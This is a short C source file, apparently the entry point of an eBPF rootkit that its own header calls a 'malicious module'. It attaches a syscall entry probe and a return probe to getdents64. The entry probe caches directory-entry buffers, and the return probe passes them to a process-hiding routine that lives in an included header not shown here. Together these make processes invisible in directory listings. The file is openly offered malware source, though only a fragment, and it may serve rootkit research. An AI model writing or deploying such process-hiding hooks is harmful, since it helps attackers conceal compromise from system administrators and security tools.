/**
 * Main entry point for the kernel ebpf malicious module.
 * 
 * @author Yekuuun
 */

#include "./includes/bpf.h"
#include "./includes/maps.h"
#include "./includes/config.h"

//modules
#include "./modules/mod_hide_proc.h"

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  HIDE PROCESS
// └────────────────────────────────────┘
//----------------------------------------------------

/**
 * ksyscall — saves dirent userspace address while syscall args are valid.
 *
 * @note => dirent is empty at this point, kernel has not filled it yet. we only save its address for use in kretprobe.
 */
SEC("ksyscall/getdents64")
int BPF_KSYSCALL(ksyscall_getdents64, unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
{
    __u64 id = bpf_get_current_pid_tgid();
 
    bpf_map_update_elem(&getdents64_cache, &id, &dirent, BPF_ANY);
    return 0;
}

/**
 * kretprobe for __x64_sys_getdents (exit => handle data saved by ksyscall_getdents64)
 */
SEC("kretsyscall/getdents64")
int BPF_KRETPROBE(kretsyscall_getdents64_hide_proc, long ret)
{
    return attach_proc_hide(ret);
}

//-----------------------------------------------------


char LICENSE[] SEC("license") = "GPL";
